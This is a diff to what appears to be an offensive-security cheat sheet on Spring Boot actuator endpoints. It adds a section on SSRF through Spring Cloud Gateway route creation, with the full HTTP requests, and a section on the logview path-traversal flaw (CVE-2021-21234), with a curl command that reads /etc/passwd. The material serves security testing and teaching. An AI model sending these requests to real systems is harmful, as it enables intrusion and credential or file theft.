@@ -69,6 +69,63 @@ These properties have no effect unless the `/restart` endpoint is called, which 
 
 > There are many other interesting properties, but most of them do not take effect immediately after being changed
 
+# gateway
+
+The [/gateway](https://cloud.spring.io/spring-cloud-gateway/reference/html/#actuator-api) actuator endpoint lets you monitor and interact with a Spring Cloud Gateway application. In other words, you can define routes for the appkication and use `/gateway` actuator to trigger requests according to these routes.
+
+There are at least the following issues:
+1. Routes can provide access to hidden or internal endpoints, which can be misconfigured or vulnerable. You can fetch all available routes via `GET`-request to `/actuator/gateway/routes`
+2. Full SSRF if [adding routes](https://cloud.spring.io/spring-cloud-gateway/reference/html/#creating-and-deleting-a-particular-route) does not require administrative permissions. The next request will create a route to localhost:
+
+    ```http
+    POST /actuator/gateway/routes/new_route HTTP/1.1
+    Host: app
+    Content-Type: application/json
+
+    {
+    "predicates": [
+        {
+        "name": "Path",
+        "args": {
+            "_genkey_0": "/new_route/**"
+        }
+        }
+    ],
+    "filters": [
+        {
+        "name": "RewritePath",
+        "args": {
+            "_genkey_0": "/new_route(?<path>.*)",
+            "_genkey_1": "/${path}"
+        }
+        }
+    ],
+    "uri": "https://localhost",
+    "order": 0
+    }
+    ```
+
+    Send refresh request to apply new route:
+
+    ```http
+    POST /actuator/gateway/refresh HTTP/1.1
+    Host: app
+    Content-Type: application/json
+
+    {
+        "predicate": "Paths: [/new_route], match trailing slash: true",
+        "route_id": "new_route",
+        "filters": [
+            "[[RewritePath /new_route(?<path>.*) = /${path}], order = 1]"
+        ],
+        "uri": "https://localhost",
+        "order": 0
+    }
+    ```
+
+References:
+- [BRING YOUR OWN SSRF – THE GATEWAY ACTUATOR](https://wya.pl/2021/12/20/bring-your-own-ssrf-the-gateway-actuator/)
+
 # trace/httptrace
 
 Displays HTTP trace information (by default, the last 100 HTTP request-response exchanges). Requires an `HttpTraceRepository` bean.
@@ -156,6 +213,18 @@ One of the MBeans of Tomcat (embedded into Spring Boot) is `createJNDIRealm`, wh
 # logfile
 
 Returns the contents of the logfile (if `logging.file.name` or `logging.file.path` properties have been set). Supports the use of the HTTP Range header to retrieve part of the log file's content.
+
+# logview
+
+[spring-boot-actuator-logview](https://github.com/lukashinsch/spring-boot-actuator-logview) version before `0.2.13` is vulnerable to path traversal that allows you to retreive arbitrary files.
+
+```bash
+# retreaving /etc/passwd
+$ curl http://localhost:8887/manage/log/view?filename=/etc/passwd&base=../../../../../
+```
+
+References:
+- [Writeup: CVE-2021-21234 Spring Boot Actuator Logview Directory Traversal](https://pyn3rd.github.io/2021/10/25/CVE-2021-21234-Spring-Boot-Actuator-Logview-Directory-Traversal/)
 
 # dump/threaddump
 
